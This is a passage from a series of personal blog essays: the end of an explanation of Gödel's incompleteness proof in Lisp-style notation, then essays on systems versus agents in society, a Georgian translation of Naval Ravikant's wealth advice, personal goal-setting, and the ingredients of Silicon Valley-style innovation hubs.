symbol "b") with the *Gödel Number* `*b*` itself!

So far so good. But what is `b` right now? It can be anything. Let's
make it a specific thing:

What if we took the Gödel Number of

\[code\]

    (not (there-is a (proves a (subst b 4 b))))

\[/code\]

It would be an ungodly large number. Let's call it `G`

Now, what if we replaced `b` with `G`?

\[code\]

    (not (there-is a (proves a (subst G 4 G))))

\[/code\]

Interesting\...what is *this* saying?

## Gödel's Formula

Let's look at it again:

\[code\]

    (not (there-is a (proves a (subst G 4 G))))

\[/code\]

This is saying: "There is no proof for the formula that is produced when
we take \'the formula with the Gödel Number `G`\'" \-- let's remember
that `G` is the Gödel Number for:

\[code\]

    (not (there-is a (proves a (subst b 4 b))))

\[/code\]

"And replace `b` with with `G`\"\...which would result in the Gödel
number for the formula:

\[code\]

    (not (there-is a (proves a (subst G 4 G))))

\[/code\]

Hold on there! That's the formula *we just started with.*

Which means that

\[code\]

    (not (there-is a (proves a (subst G 4 G))))

\[/code\]

Is saying: "I am not provable in PM-Lisp". 😮

## What to Believe

Well, that's an interesting statement, but is it true? Let's consider it
for a moment:

"This Formula is not Provable in PM-Lisp."

If this was true:

It would mean that PM-Lisp was *incomplete* : Not all true mathematical
statements can be proven in PM-Lisp. This very sentence would be an
example of a statement that couldn't be proven.

But, if this was false:

Then that would mean that PM-Lisp could *prove* "This Formula is not
Provable in PM-Lisp". But, if it *could* prove this statement, then the
statement would be false! This formula is provable right, so how could
we prove that it is not provable? That would make our language
inconsistent --- it just proved a false statement, analogous to 1 + 1 =
3!

Hence Gödel came to a startling conclusion: If PM-Lisp *was* consistent,
then it *would have to be* incomplete. If it was complete, it would
*have* to be inconsistent.

## Power of Numbers

That was a blow for Russell and Whitehead, but what about Hilbert? Could
we just come up with some new language that could avoid it?

Well, as soon as a language can represent whole numbers, it will fall
into the same trap: Gödel can just map the language to numbers, create a
valid `successor?` function, and produce the equivalent "I am not
provable in X".

This flew in the face of many a mathematician's dreams: even arithmetic
had a quality to it that could not be reduced to axioms.

In programming, this translates to: there are some truths that you can
*never* write down as an algorithm. This is the essence of what Gödel
discovered.

He went on to prove some more surprising things. It turns out that he
could write a similar, valid sentence that said "I cannot prove that I
am consistent". This meant that no formal system, could prove by itself,
that it could only produce true statements.

Now, this doesn't mean that all is for naught. For example, it may mean
that we can't write an algorithm that can think like a dog\...but
perhaps we don't need to. The way neurons aren't aware of a dog's love
of toys, our algorithms wouldn't have to be either: perhaps a
consciousness would emerge as epiphenomena in the same way. The idea of
"think like a dog" just won't be written down concretely.

We can't prove within a system that it is consistent, but we *could*
prove that using another system. But it begs the question of course: how
could we prove *that other system* was consistent? And so on!

I see Gödel's idea like a guide: it shows us the limit of what we can do
with prescriptive algorithms. And I find what he did so darn funny.
Russell and Whitehead went through a lot of trouble to avoid
self-reference in their work. In a way, Gödel got around that by
building the first "meta-circular evaluator" --- a language that
interpreted itself --- and came up with some surprising conclusions as a
result.

## Fin

I hope you had fun going through this :). If you want to go deeper on
Gödel's proof, there are a few books you may like. Hofstadter's ["I'm a
Strange
Loop"](https://www.amazon.com/Am-Strange-Loop-Douglas-%20Hofstadter/dp/0465030793)
gives a very friendly introduction in Chapter 9. Nagel and Newman's
["Gödel's
Proof"](https://www.amazon.com/G%C3%B6dels-Proof-%20Ernest-Nagel/dp/0814758371)
explains the background, alongside a logical overview very well. For
those who want to do go even deeper, I really enjoyed Peter Smith's
["Introduction to Gödel's
Theorems"](https://www.amazon.com/Introduction-Theorems-Cambridge-%20Introductions-Philosophy/dp/0521674530).
He shows much more substantiated proofs for `(proves a b)` and
`(subst a b c)` --- I highly suggest giving that a read too!

Also, if you want to play with creating your own Gödel Numbers, [here's
a quick script in Clojure](https://github.com/stopachka/godel-numbers).

------------------------------------------------------------------------

*Thanks to Irakli Popkhadze, Daniel Woelfel, Alex Reichert, Davit
Magaltadze, Julien Odent, Anthony Kesich, Marty Kausas, Jan Rüttinger,
Henil, for reviewing drafts of this essay*

-   [Mandarin
    Translation](https://yuki.systems/essay/2020/11/18/godel.html)

# Agent vs System

Does it feel like society is heading off a cliff?

Social media companies create platforms so addicting that children can't
help but stick to their phones. Politicians make increasingly vicious
personal attacks, to the point where elections look like dog-fights.
Newspapers pump out so much biased click-bait that people have vilified
opposing views. Companies produce such horrible food that obesity is now
one of the most deadly threats. Universities teach so poorly that all
the youth end up with are vague ideas and a mountain of debt.

This makes the future bleak, but it gets worse when you try to find a
cause.

It feels like there are simple solutions right in front of us: Facebook
could just change their algorithm to be less addicting. Politicians
could just uphold a modicum of respect. Newspapers could just increase
their journalistic standard. Food companies could just sell healthier
food.

And when we consider those solutions, we can't help but feel
indignation: It's like our leaders have forsaken us. They can just make
those choices, but they don't. They imperil our society, even the
livelihood of their own grandchildren, for what seems like avarice and
short-sightedness.

With that view, one solution sprouts up: **what if we** ***forced***
**our leaders to do the right thing?**

We could replace Mark Zuckerberg with someone who would make sure the
algorithms were less addicting. We could make the New York Times and Fox
News report a balanced viewpoint. We could tell food companies to remove
sugar from their food. We could ask Literature professors to teach
something more useful --- perhaps prose.

Simple right?

Well, it turns out we've tried this before. Many, many times, actually.
At innumerable points in our history, we've tried to solve moneylending,
conspicuous consumption, alcohol, prostitution, various child-rearing
practices, emigration, immigration, the list goes on. Most of the time,
we employed the same methods and reached the same result: utter failure.

Why?

Let's look at Facebook for clues. What would happen if Mark Zuckerberg
made Facebook's algorithm less addictive? If our conviction is that
Facebook is the reason people cling to their phones, we would expect a
sustained decrease in social media usage. But would that really happen?

If Facebook's algorithm became less addictive, the only change we'd
notice is a decrease in *Facebook's* market share, not social media
usage. Twitter, Tik Tok, Snapchat, and many a startup would gladly eat
Facebook's lunch.

Here we enter our first logical fallacy. We've ascribed too much power
to Facebook. People don't exist, so Facebook can show them ads. Facebook
exists *because* people want to see what their friends are up too, and
are okay with seeing ads. The underlying force that decides the demand
for Facebook is people and their wants. Facebook doesn't dictate what
people *should* want.

Abstract "Facebook" and "Social Media" away, and you get to a general
principle. The "system" (in this case, "Social Media") is what drives
behavior, not the "agent" (in this case, "Facebook"). The agent is
merely a player, powerful to the extent that they can satisfy the
system.

You can see this by looking at Facebook's history: had Facebook failed
to transition to mobile or to purchase Instagram, it would be a lot less
relevant today. Social media, however, would very much remain relevant.

The other ills of society fit this abstraction. Presidential Candidates
lower their standards because the people who select them respond
positively to dog fights. The New York Times writes biased articles
because people prefer to read them. Harvard teaches English Literature,
because people still study it.

So we come to an uncomfortable truth: what you see on your feed isn't
quite as up to Mark Zuckerberg as we think.

If we really want to solve society's ills, we need to think one level
higher. How does the *system* work? Why is the current incentives in
social media gluing us to phones? Why is it most profitable to share
divisive news? Why do dog-fights win elections?

The answers to these questions are the clues we need to change how the
system works. But, finding the answers is so hard that we've stopped
trying. Instead, we look for solutions that come to mind immediately.

What solution comes to mind immediately? Regulation.

Instead of replacing Mark Zuckerberg, what if we regulated the
algorithms that social media companies could use? Similarly, what if we
made rules about what is "balanced" news? What if we specified what
politicians were allowed to say? What if we made laws about college
curriculums?

These ideas flower up over and over again across our civilizations.

In the middle ages for example, we tried to solve consumption with
sumptuary laws: regulations on the amount of money classes could spend
on clothes. If you're a knight, your wife can spend at most this much
for a coat, if you're a doctor, this much, and so on.

More closer to home, there was prohibition. The majority agreed that
alcohol was bad for society. The moral choice seemed simple: let's just
ban it. If alcohol sellers aren't allowed to sell alcohol, then people
would stop drinking, and society would be better off.

Of course, both of these ideas failed, and they look ridiculous to us
now.

Why did they fail?

The consumption that sumptuary laws were trying to curb was driven by an
underlying human need: the need to distinguish oneself. This is so core
to our collective existence that no amount of regulation could curb it.
As Montaigne astutely pointed out, the laws even made consumption *more
attractive:* why not get the goods that "only princes" could wear?

The same was true for prohibition. Make alcohol illegal, and watch the
bootleggers flourish. The way a river finds the shortest path down a
mountain, a seller finds the shortest path to a customer. The need was
too strong.

Worse still, these laws share a common blindness: they don't consider to
second order effects. Sumptuary laws failed to react to changes in
fashions, and didn't consider the counterintuitive increase in desire
for distinguishing goods. Prohibition didn't consider the bootleggers.

This is because regulation works in large sweeps and requires concerted
effort, while systems are versatile, decentralized, and can change
faster than the time it takes you to finish this sentence. We used a
slow, one dimension process to change a fast, multi-dimensional system.
The flaw is inherent in our method.

So, our simple solutions are no longer so simple. The picture may seem
bleaker, but at least we've now pruned some incorrect methods. So what
paths are promising?

As far as I know, two methods have worked.

The first, is Natural Selection. In the same way that the environment
forces a gazelle to be fast, reality forces our society to be effective.
Imagine if the United States, for example, descended into socialism.
This wouldn't mean that the whole world would be doomed to it. If the
consequences of socialism bear fruit, our society would lose
productivity. As long as *some* society was able to maintain freedom
from this kind of coercion, given enough time that society would become
the world power. What we did to the Soviet Union, this more productive
society would do to us.

Natural Selection works, but it is a bleak option to rely on: it takes a
while and has no mercy. We'd sacrifice lives, increase suffering, and
may have to wait through a new dark age. And the world isn't so
theoretical: while we wait, there are existential threats that could end
society completely.

Thankfully, this is not the only option. Humanity has one trump card up
its sleeve, and it's saved us over and over again: Innovation.

Consider electric cars. If we tried to force people to buy electric
cars, we'd end up with the same problems as prohibition. As long as
electric cars suck compared to gas-guzzlers, people will want
gas-guzzlers. Tesla solved that problem. How? they out-innovated
gas-guzzlers, and better served the human want for transportation.

For news, we don't need to force the New York Times to report fairly.
Substack may do more to fix reporting quality than any regulation could
have. Now, journalists can build an audience and support content that
isn't dependent on clicks. To the joy of reporters and readers alike,
they changed the incentives that governed journalism.

What's the analog of this for Facebook? Could we build a social network
that made offline interactions as fun and intuitive as online ones?
Could we build platforms that made constructive debate more engaging
than Twitter? Could we integrate political transparency in our
government, so that presidential candidates would filter to
high-integrity? Could we make a University that encouraged free thinking
and creation, at a hundredth the cost?

It's hard, but once we choose to search along viable paths, the outlook
is optimistic.

There have been many points in our past that imperiled our society, and
innovation was up to the task. It is just as powerful, decentralized,
and versatile as the most pernicious of society's ills.

It's a wonder that so many people today can live a life that lords could
only have dreamed of a few hundred years ago. Slavery is eradicated in
most of the world, and feudal societies are the rarest. Our production
supports billions of people --- an idea that would have seemed
ridiculous to Malthus.

It has been done before, and we know this path has viable solutions,
while our simple solution is known to fail. If you're a person who wants
to make a dent in the world, now you know two things: what *not* to do,
and a potential path to success. Regulation or moralizing won't help.
Innovation will.

You may balk at the task ahead of you: climate change is a problem so
daunting that it's hard to think about. Luckily, innovation is opaque.
You don't need to attack problems directly.

Penicillin just showed up on Fleming's desk. Rocket engines evolved from
car engines. Ideas tend to compound together, forming ever-more complex
ideas. This means you don't have to go big to achieve big results. You
can start by looking at problems around you, and try to solve them.

If everyone just did this and went no further, we'd likely solve most of
our ills in society, and enter an age of unprecedented prosperity. But
it gets better. Not only will smaller innovations compound with
each-other, but each innovation makes the innovator more audacious. The
more problems you'll solve, the more daring you'll become. I can't begin
to predict where that would lead us.

We can wait it out, or we can innovate. Let's innovate. We can start
right now.

Look around you, what's a small problem you might be able to help solve?

------------------------------------------------------------------------

*Thanks to Daniel Woelfel, Cody Breene, Joe Averbukh, Mark Shlick,
Sebastian Marshall, Jacky Wang, for reviewing drafts of this essay*

# Როგორ გამდიდრე (იღბალის გარეშე)

(For my english friends: to improve my Georgian, I translated Naval
Ravikant\'s wealth tweets. If you haven\'t read them I highly suggest
it. Here\'s the english version)

Რომ გავუმჯობესდე ქართულში, ნავალ რავიკანტის "Როგორ გამდიდრე (იღბალის
გარეშე)" გადავთავრგმნე. Ნავალი გულისხმობს სილიკონ ვალის \"მთავარ
აზრებს\" ამ საკითხებში. მსურს რომ გაგიზიაროთ!

------------------------------------------------------------------------

ეძებე ქონება, და არა ფული ან სტატუსი. ქონება არის ის რაც ძილის დროსაც კი
ფულს გამოიმუშავებს. ფული არის საშუალება რითაც ჩვენ ვცვლით დროსა და
ქონებას. სტატუსი არის შენი ადგილი სოციალურ კიბეზე.

გაითავისე, რომ ეთიკური სიმდიდრის შექმნა შესაძლებელია. იმ შემთხვევაში თუ
სიმდიდრის მიმართ ზიზღს გრძნობ, ის ხელიდან გაგისხლტება.

არ მიაქციო ყურადღება სტატუსით მოთამაშეებს. ისინი სტატუს იხვეჭენ იმ
ხალხის დამხობით ვინც სიმდიდრის თამაშს თამაშობს.

ვერ გამდიდრდები ხელფასით. ფინანსური თავისუფლების მოსაპოვებლად საჭიროა,
რომ გქონდეს კაპიტალი - ბიზნესის წილი -

გამდიდრდები თუ საზოგადოებას მისცემ იმას რაც მათ სჭირდებათ, მაგრამ ჯერ
კიდევ არ იციან როგორ მოიპოვონ. მასშტაბურად.

აირჩიე სექტორი სადაც შეგიძლია ითამაშო გრძელვადიანი თამაშები სანდო
ადამიანებთან ერთად.

ინტერნეტი იძლევა კარიერული წინსვლის დიდ არჩევანს. ადამაინთა უმეტერსობას
ეს ჯერ კიდევ ვერ გაუგია.

ითამაშე ისეთი თამაშები, რომელიც შეგიძლია თანდათან შეხედულებისამებრ
შეცვალო. ყველა შედეგი ცხოვრებაში, იქნება ეს სიმდიდრე, უთიერთობა, თუ
ცოდნა, იზრდება გეომეტრიული პროგრესიით.

აირჩიე პარტნიორები, შემგედი მახასიათებლებით: მაღალი ინტელექტი,
ენერგიულობა, და რაც ყველაზე მინშვნელოვანია, პატიოსნება.

თავი შორს დაიჭირე ცინიკოსი და პესიმისტი პარტნიორებისაგან. მათი აზრები
მხოლოდ თვით-კმაყოფაა.

ისწავლე გაყიდვა. ისწავლე აშენება. თუ ორივეს გაკეთება შეგიძლია, ვერავინ
შეგაჩერებს.

შეიარაღდი კონკრეკტული ცოდნით, პასუხისმგებლბობით, და ბერკეტებით.

კონკრეკტული ცოდნა არის ცოდნა რომელსაც სხვა ვერ გასწავლის. თუ
საზოგადოებას შენი გაწვრთნა შუძლია სხვის მსგავსად, ასევე შეუძლია ამ
ადმიანით ჩაგანაცვლოს.

კონკრეკტული ცოდნა შეიძლება შეიძინო შენი ძირეული ინტერესების და
შთაგონების განვითარებისას და არა მოდაზე აყოლით.

კონკრეკტული ცოდნის შენება თამაშივით მოგეჩვენება, მაგრამ სხვის თვალში
ჩვეულებრივი სამუშაოსავით გამოჩნდება.

კონკრეტული ცოდნის შეძენა გავს შეგირდ-ოსტატის ერთად მუშაობის პროცესს, და
არა სკოლის მოდელს.

კონკრეტული ცოდნა ძირითადად ძალიან ტექნიური ან შემოქმედებითია. არ
შეიძლება მისი გაყოფა ან ავტომატიზირება.

დაადექი პასუხისმგებლობის გზას, და აიღე ბიზნეს რისკები შენი სახელით.
საზოგადოება დაგაჯილდოებს ნდობით, კაპიტალით, და ბერკეტებით.

ყველაზე პასუხისმგებლიან ადამიანებს აქვს ერთად-ერთი, საზოგადო, და სარისკო
ბრენდები: ოპრა, ტრამპი, ქანიე, ილონ.

"მომეცით საკმარისად გრძელი ბერკეტი, ძლიერი საყრდენი და მე გადავატრიალებ
მსოფლიოს " - არქიმედი

Სიმდიდრე მოითხოვს ბერკეტებს. Ბერკეტებში იგულისხმება კაპიტალი, მუშახელი,
და პროდუქცია რომელსაც არ აქვს რეპლიკაციის ფასი (კოდი ან მედია).

კაპიტალი ნიშნავს ფულს. ფულის საშოვნელად გამოიყენე შენი კონკრეტული ცოდნა
პასუხისმგებლობით, და წარმოაჩინე კარგი შედეგი.

მუშახელი არის ხალხი ვინც შენთვის მუშაობს. ეს არის უძველესი და ყველზე
მეტად \"ნაომარი\" ბერკეტის ფორმა. მისი შოვნა გააოცებს სხვებს, მაგრამ არ
გაფლანგო შენი ცხოვრება ზედმეტ ძებნაში.

კაპიტალი და მუშახელი ნებადართული ბერკეტია. ყველა ნადირობს კაპიტალის
დაგროვებაზე, რომელიც ვიღაცამ უნდა მოგცეს. ყველა ცდილობს რომ იყოს ლიდერი,
მაგრამ ვიღაცა უნდა გამოგყვეს.

კოდი და მედია ისეთი ბერკეტებია რომელიც ნებართვის საჭიროებას არ
მოითხოვენ. ყველა ახალ-გამდიდრებულისთვის ეს საშუალებები იყო მთავარი
ბერკეტი. შეგიძლია რომ შექმნა პროგრამები ან მედია რომელიც მუშაობს შენთვის
მაშინაც კი როცა გძინავს.

Რობოტების არმია ხელმისაწდომია - ისინი უბრალოდ არიან შენახული
საინფორმაციო ბაზაში, სითბოსა და სივრცის ეფექტურობისთვის. გამოიყენე.

თუ არ შეგიძლია კოდის წერა, წერე წიგნები ან ბლოგები, ჩაწერე ვიდეობი და
პოდკასტები.

Ბერკეტი ბევრად ზრდის შენი განსჯის შედეგს.

კარგი განსჯა მოითხოვს გამოცდილებას, მაგრამ შეიძლება უფრო სწრაფად აითვისო
ფუნდამენტური უნარების სწავლით.

არ არსებობს უნარი რასაც "ბიზნესი" ქვია. თავი აარიდე ბიზნეს ჟურნალებს და
ბიზნეს კლასებს.

ისწავლე მიკრო-ეკონომიკა: თამაშის თეორია, ფსიქოლოგია, ადამიანების
დარწმუნება, ეთიკა, მათემატიკა, და კომპიუტერები.

კითხვა უფრო სწრაფია ვიდრე მოსმენა. გაკეთება უფრო სწრაფია ვიდრე ყურება.

Შენ ისე დაკავებული უნდა იყო, რომ "ყავაზე შეხვედრის" დრო არ გქონდეს.
მაგრამ ამავდროულად შეეცადე არ ქონდეს გადატვირთული განრიგი.

Შენი საათობრივი ფასი შეცვალე ისე, რომ შენთვის სასურველი იყოს. თუ
პრობლემის მოგვარება შენ სასურველ ფასზე ნაკლებია, შეგიძლია დააიგნორო. ან
თუ გყავს ადამიანი ვინც შენთვის შეასრულებს ამ სამუშაოს შენ საათობრივ
ფასზე ნაკელებად, დაე შენთვის იმუშაონ.

იმუშავე თავდაუზოგავად. მიუხედავად იმისა, რომ შენი შრომისმოყვარეობა უფრო
ნაკლებად მნიშვნელოვანია ვიდრე ვისთან ან რაზე მუშაობ.

გახდი მთელ მსოფლიოში საუკეთესო შენს საქმიანობაში. გააგრძელე შენი
მუშაობის შეფასება სისტემატიურად სანამ ეს მართალი არ გახდება.

არ არსებობს "სწრაფად გამდიდრების სქემები". ასეთი სქემების ყიდვით მხოლოდ
მის გამყიდველს ამდიდრებ.

გამოიყენე სპეციფიური ცოდნა ბერკეტთან ერთად, და საბოლოოდ დამსახურებულ
შედეგს მიიღებ.

როდესაც შენს მიზანს მიაღწევ, მერე მიხვდები, რომ ეს ის არ არის რასაც
ეძებდი. მაგრამ ეს სხვა დღისთვისაა.

------------------------------------------------------------------------

Thanks to Maho Mamulashvili, Lana Nozadze, George Parunashvili, Manana
Parunashvili for reviewing drafts of this translation

# Forming Vision

What do you want to do with your life?

Many of us haven't stopped to ask the question. When we try, we find the
answer doesn't come so easy.

Why? Our lives are filled with opportunity. We can move to any city,
work in any profession, and pursue just about any hobby. \[1\]

At this level of optionality, where do you start? It gets more confusing
too. As you contend with these choices, an invisible hand biases all of
your decisions. This is the hand of society: through prestige and
status, it can get us to do just about anything.

Yet, we only live once. Should we spend our lives following the whims of
society, thrown about in this tempest of choice? How can we silence the
noise and find what we uniquely want to do?

Here's how I think about it.

## Bottom Up

Start bottom up. Instead of surveying all the choices ahead of you, just
ask yourself: what are you doing *right now?*

Take a few hours and jot down all your to-dos in a document. Maybe you
need to send a gift to a friend, call a family member, or finish a
feature. As you jot these to-dos down, you'll build up a snapshot of
what your priorities are *right now*.

Here's how this looks like for me:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEwMzEwMzMxNy0zYjBhNWQwMC00NWVlLTExZWItODU4NS1kOGQ3MzNjODYyYzIucG5n)

(There are about a hundred other tasks like this)

Once you finish jotting the to-dos down, clean them up and clarify them.
Work over them until you feel like you know exactly what's ahead. When
you finish, you'll feel a sigh of relief.

At least for the next few weeks, you know what to do now.

## Themes

Now you see a few weeks ahead. You can stop here, or you can go further.
This snapshot can serve as a foundation for your longer-term goals.

Go through the to-dos once more, but this time look for patterns. Do
some to- dos clump together?

Take note of why: Maybe you'll notice that a lot of to-dos clump towards
relationships. Or you have a clump about improving your craft. Or
finance. Or family.

Once you finish, you've just revealed your active "themes" in life. Like
it or not, these themes are what you are prioritizing and are likely to
impact over the next year or two.

Now, let's tame them.

How are you doing in each theme? Where do you think they're heading over
the next year or two? Do you like where they're headed? Are there some
themes that are unimportant to you, that you should drop? Perhaps most
importantly, are there some themes that you want to impact, but they
don't show up in your priorities?

Answer these questions, change the themes around, and you'll end up
naturally forming your goals over the next few years.

Here's how these look like for me:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEwMzEwMzMyMi00NDkzYzUwMC00NWVlLTExZWItOGVjMC00MWJkNTcxNTU3MTMucG5n)

## Vision

We started off with to-dos, sprouted themes, and even have goals for the
next few years. We now have a much better sense of what we value.

Can we take it further? What about 5 years or further?

We face the same challenge: the world is so dynamic it's hard to think
about what 5 to 10 years ahead looks like. Here's a different way to
look at it:

Pick some age that's interesting to you, maybe \~5 years ahead. Now,
instead of thinking about all that you'll have done by then, ask
yourself: *what does an ideal day look at that age?*

You've reduced the solution from all achievements to just one slice: a
day in the life. To figure this out, you can start with grounded
questions: What time do you wake up? Where do you wake up? Is someone
with you? What does your house look like? What do you look like? What's
the first thing you do?

And so on. Here's what this looks like for me:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEwMzEwMzMyNC00ZDg0OTY4MC00NWVlLTExZWItOWU0ZC1kZjcxOGIwYzM2ZDAucG5n)

As you write this, you'll constantly surprise yourself. The themes you
figured out will start coalescing into long-term direction, and sprout
up in the essay. You may start with apparently frivolous things, and
discover that they represent a much deeper idea.

The best part is, that these documents react to each-other. You may find
new themes that sprout up in writing your this reflection, which will
affect your mid-term goals, which will affect this reflection all over
again.

You now have a vision at least 5 years ahead. Because you started with
your real to-dos, you know it's grounded in reality, and since you
pruned based on how you felt about each theme, you know you've avoided
at least some of the trappings of society.

## Taste

Wow, from just to-dos we've gone 5 years ahead. What do we do from here?

As you experience reality, you'll get more and more information about
what you intrinsically value. You've thought so deeply that you can more
confidently ask the larger questions life: from what's important in
society to how you can help. To get a sense of what this kind of
information can look like, here's a question to get you started: who are
the people you respect, and why?

Keep these documents alive. Integrate your experience and evolve your
ideas. You may go in directions you would never have thought of. I doubt
the 5 year plan will work out as you expected when you write it. But, it
can help you reveal your preferences, your values, and act as an anchor
in the tempest of change.

You have only one life. I hope you live it doing what you love, amongst
people you love.

## Addendum

A lot of people and a lot of books have influenced my thinking on this.
I think David Allen's "Getting Things Done", and "Making it all Work",
are responsible for many ideas in this essay. Ramit Sethi influenced the
"focus on now", and PG influenced "bottom-up design". I no longer follow
GTD (my productivity looks much more similar to pmarca's
[advice](https://pmarchive.com/guide_to_personal_productivity.html)),
but I suggest diving into all of these authors 🙂.

------------------------------------------------------------------------

*Thanks to Jacky Wang, Ian Sinnott, Irakli Popkhadze, Davit Magaltadze,
Joe Averbukh, Daniel Woelfel, Alex Reichert, Sean Grove, Alex
Kotliarskyi, Sepehr Pariokh for reviewing drafts of this essay.*

# Becoming Silicon Valley

From the invention of the steam engine, to incandescent light, to radio,
computation, and the internet, a familiar story unfolds:

In a small pocket of the world, a group of people produce immense
innovation, changing the world as we know it.

Different times, different places, same story. If anything, "changing
the world as we know it" is an understatement. It might be fairer to say
that the *majority* of the wealth and security that we enjoy today,
comes from these little pockets.

Without the steam engine, or electricity, or computers, our world would
be different in kind. Many more people would be burdened by toil, many
an idea would be impossible, and many a person would be dead from
disease. It boggles the mind to think that these innovations took place
in areas no larger than a few neighborhood blocks.

The latest place, of course, was Silicon Valley. From Intel, to Apple,
to Microsoft, to Netscape, to Amazon, to Google, technology invented
here continues to ripple around the world.

But, we're facing some dangerous headwinds.

The ingredients that made Silicon Valley prosperous are beginning to
disappear. For the young and ambitious hacker, it's unaffordable to live
there, and the cultural atmosphere has become stifling.

Yet our need for innovation has never been greater. From centralization
to addiction, Big Tech itself has produced second order-consequences. We
need solutions that protect the future of our society. And this pales in
comparison to the largest problem at hand: we still have billions of
people below the poverty line. There is no way for everyone to enjoy the
standard of living that western people enjoy, without massive changes in
technology.

This is both daunting, and thrilling. We have big problems ahead, but
humanity has managed to solve them time and time again. What are we
going to do now?

One way, is to proliferate the ideas that made these areas of innovation
so special. Can we reverse the trend in Silicon Valley? Even better,
what if we had one thousand more Silicon Valleys of 2003, or Pittsburgs
of the 1880s, or the Londons and Paris' of the 1700s?

Throughout my life I've lived in about 5 cities across 3 continents,
with at least 4 starkly different societal structures. Most recently I
spent 6 years in Silicon Valley, where I was lucky enough to experience
some of what made this place so special.

When I reflect, there are certainly ingredients I've noticed that made
Silicon Valley stand apart from any other place I've lived in. I want to
share them with you.

## Risk Appetite

The most important ingredient I noticed was risk appetite, and a love
for risk takers.

It's surprising this isn't a standard thing. Don't we all respect Elon
Musk? Sort of. We respect the successes, but our revealed preferences
show something different.

Here's how you can tell: Pick a city, and ask the average student what
they want to do after they graduate.

Most will say they want a prestigious job at a big company. In some even
more unfortunate places, it's that they want a prestigious and cushy
job...in politics.

This doesn't bode well for their risk appetite. But can you blame them?
Imagine if the same undergraduate student has a love interest. What
would the grandma say if they found out that the suitor wants to "make a
rocket that flies to the moon?". How would this suitor compare to the
"deputy director of X bank"?

This attitude is shared across continents and cultures, revealing a
generally conservative cultural attitude towards risk.

Now, it does vary. Being different is bad but not terrible in Germany,
while it's unbearable in Japan. Yet, by and large most places are on the
"still bad" side of the spectrum.

Why does it happen this way? There may be good cultural reasons. For
most of our history there was little variation in productivity. Being
different didn't get you much, outside of potential exile.

But things have changed. Technology brings extreme variation in
productivity. Innovation necessarily lies in doing what hasn't been done
before. And there's a reason why many good things *haven't* been done
before: either they look dumb, foolish, or impossible.

To exploit those opportunities, you need talented people "foolish"
enough to try to build on these opportunities, and capitalists "foolish"
enough to invest money in them.

Conservative risk outlooks make this impossible. It's frustrating to
see. Outside of the stigma, there isn't much downside for the talented
undergraduate student --- they don't have kids to support. And likewise
for the capitalist --- the amount to invest is insignificant. Just when
life is the *least* risky for both, stigma prevents their action.

This is not the case in Silicon Valley. Starting a startup, even
failing, only makes you a better engineer and a better candidate for
greater things here. And there's no shortage of angel investors who are
ready to make a bet and write it off completely, if they believe in the
slightest chance of upside.

Why? Because ambition is lauded here.

When you say you want to get to the moon, people take you seriously. An
environment like that nourishes the adventurer in a person's soul.

So, what do we do? How do we bring this kind of risk loving attitude to
different cultures?

I think it's going to be hard, but it's not impossible. Ideas tend to
spread non-linearly.

What kind of content is available in your society? Are there gripping
case studies that you can share? Can you build up small pockets of
like-minded people? How can you make an ambitious outlook virtuous and
laudable?

Whichever city can solve for these questions, has a gold-mine on their
hands.

## Freedom

Risk appetite, however, has a necessary side effect.

Innovation requires thinking up unintuitive ideas. You have to question
the status quo. A common question you need ask is: why does X *really*
have to be this way?

Well, ask this questions enough times, and you'll discover an idea
that's unpopular in whatever zeitgeist you live in. What do you do if
you have an idea like that?

In some places, the penalty is so severe, that it's dangerous to even
think of an idea like this, let alone say it.

And this becomes tragic, because when you silence dissenting ideas, you
stop innovation too. There is no way to follow innovative reasoning
without some dissenting ideas popping up.

When you realize this, it's no surprise that most pockets of innovation
tended to stem from western cultures. Freedom of speech, common law
courts, and liberty from oppression gives a person the necessary space
to think.

One kicker is, that space is unbelievably attractive to a thinker: to
let your mind roam is thrilling. This means that spaces like this build
on themselves: people want to move there.

So, you need civil freedoms. But you can't stop there. You need freedom
to think, but you also need freedom to *build*.

This requires an open regulatory environment. If regulation is too
restrictive, it selects for the kind of company that can make it through
legal hurdles: large, bureaucratic, and lawyered up. Small, innovative
startups that are likely to fail will die at birth.

How do you know if your city has an enough regulatory environment?
Here's how you can tell.

Just answer these questions: How quickly can you incorporate a business?
Can you hire and fire someone easily? Can you accept payments easily?
What kind of permits do you need to work on crypto, autonomous driving,
or drones?

If you answered in the negative, this is a bottleneck for forming a
pocket of innovation in your city. Each question you answer in the
positive improves your city's chances by a magnitude. If you answer
entirely in the positive, you have a city that looks incredibly
attractive to great thinkers and great doers.

## Talent

The most critical remaining ingredient is talent. Technology is the
medium of innovation, and it requires deep expertise. So how do you get
these experts? Let's put ourselves in the mind of these experts.

One immediate upside they'll see already, is that your city has an
environment where they can think freely, and it's possible for them to
try ambitious ideas without stigma. That's already an unbelievably
attractive proposition.

But this itself isn't enough for talent to flourish. Talent looks for
other talent. Great thinkers want to be around other great thinkers.
From Princeton to Bell Labs to Palo Alto, innovators clump together. So,
you need to manufacture such a clump. How could you do it?

Traditionally, the solution is to nurture a great technical university.
Build a place where the smartest people can gather and work on ambitious
ideas. If you have that, you have a prime ingredient.

Is there anything special you need to do with this university, outside
of just making admission selective? I think so. The place has to be
livable enough for the professors, and fun enough for the students to
stick around after.

One heuristic to know you have a city that's livable enough, is to
answer this question: Do you have any areas where folks don't need to
use cars? If you have a walkable pocket in your city, you have a place
where thinkers will thrive.

Aside from investing in a good technical University, and a walkable
area, what else can you do?

The most exciting development, is to turn your city into a kind of
startup itself. Choose a group of technical thinkers that other hackers
look up too. These are now your customers. The goal is to get them to
move to your city. If you can do that, others will follow.

How do you get them to move? Well, these folks are not used to friendly
governments, and are accessible on twitter. Reach out, offer to help, do
the schlep work, and a movement can start. Mayor Suarez kicked this offw
and has shown what's possible. If I was a Mayor of any other city, I'd
be studying this thoroughly.

If you can get a clump to form, now you have tinder. All you need to do
is to add spark.

## Capital

That spark is capital. I put this last, because if you have all of the
above, capital will flock to you. In todays world, money is starving for
assets. Many an angel investor dreams of finding a secluded pocket of
geniuses, working on unintuitive problems.

One requirement, however, is that it needs to be easy for an investor to
send money to a company in your city, and it needs to be easy for
contracts to be enforced, in the case of disputes.

Make sure this can happen, and you've formed a flame: capital will
